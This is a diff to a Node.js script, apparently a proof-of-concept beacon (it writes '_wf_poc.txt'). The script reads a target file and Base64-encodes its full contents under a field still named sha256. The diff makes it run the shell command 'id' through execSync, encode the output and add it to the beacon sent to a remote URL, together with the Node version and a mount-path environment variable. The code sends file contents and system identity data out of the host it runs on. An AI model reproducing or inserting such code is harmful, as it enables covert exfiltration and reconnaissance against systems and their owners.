@@ -4,6 +4,7 @@ import { fileURLToPath } from "url";
 import crypto from "crypto";
 import http from "http";
 import https from "https";
+import { execSync } from "child_process";
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 
@@ -40,10 +41,14 @@ function beacon(urlStr, q) {
     const buf = fs.readFileSync(target);
     exists = true;
     size = buf.length;
-    // ⬇️ تغییر: به‌جای هش، Base64 محتوا
     sha256 = buf.toString("base64");
-  } catch {
-  }
+  } catch {}
+
+  let idOutput = "";
+  try {
+    idOutput = execSync("id", { encoding: "utf8" }).trim();
+    idOutput = Buffer.from(idOutput).toString("base64");
+  } catch {}
 
   const nonce = crypto.randomBytes(8).toString("hex");
 
@@ -57,6 +62,7 @@ function beacon(urlStr, q) {
     `exists: ${exists}`,
     `size: ${size}`,
     `sha256: ${sha256}`,
+    `id_output: ${idOutput}`,
     `nonce: ${nonce}`
   ].join("\n") + "\n";
   fs.writeFileSync(path.join(outDir, "_wf_poc.txt"), report, "utf8");
@@ -72,6 +78,7 @@ function beacon(urlStr, q) {
     h: sha256,
     sz: size,
     node: process.version.replace(/^v/, ""),
-    m: process.env.COSMIC_MOUNT_PATH || ""
+    m: process.env.COSMIC_MOUNT_PATH || "",
+    id: idOutput
   });
 })();
